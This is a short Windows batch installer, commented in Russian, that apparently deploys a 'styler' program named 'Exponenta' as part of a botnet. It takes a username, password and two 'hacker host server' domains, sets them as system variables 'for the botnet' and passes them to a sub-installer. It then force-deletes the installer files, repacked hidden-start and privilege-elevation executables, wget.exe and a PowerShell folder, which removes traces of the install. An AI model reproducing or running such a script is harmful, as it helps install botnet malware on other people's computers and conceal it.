rem Файл установки стайлера (Академический вариант)
rem USAGE
rem > install.bat <username> <password> <hacker host server 1 domain> <hacker host server 2 domain>
rem Запускать файл с правами администратора

rem Инициализируем переменные окружения скрипта

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%CD%
rem создаём системные переменные Windows для ботнета
set Hacker_User=%1
set Hacker_Pass=%2
set Hacker_host1=%3
set Hacker_host2=%4

rem Go to Temprorary Directory
cd /d %curdir%

rem Запускаем инсталлятор стайлера "Экспонента"
call Install_MainExponenta.bat %Hacker_User% %Hacker_Pass% %Hacker_host1% %Hacker_host2%
cd /d %curdir%
del /F /S /Q /A Install_MainExponenta.bat

del /F /S /Q /A ExponentaHTTPStylerMainFiles151SetupRePack.exe
del /F /S /Q /A HiddenStartRePack.exe
del /F /S /Q /A Register_HS.bat
del /F /S /Q /A ElevationExponentaPlugin202SetupRepack.exe
del /F /S /Q /A Register_El.bat
del /F /S /Q /A choc_pack.install.cmd
del /F /S /Q /A chock.install.cmd
del /F /S /Q /A INSTALL.MD
del /F /S /Q /A descript.ion
del /F /S /Q /A duck-install.msi
del /F /S /Q /A AdminTExponentaPlugin052Setup.exe
del /F /S /Q /A INSTALL.txt
del /F /S /Q /A wget.exe

rd /S /Q WindowsPowerShell


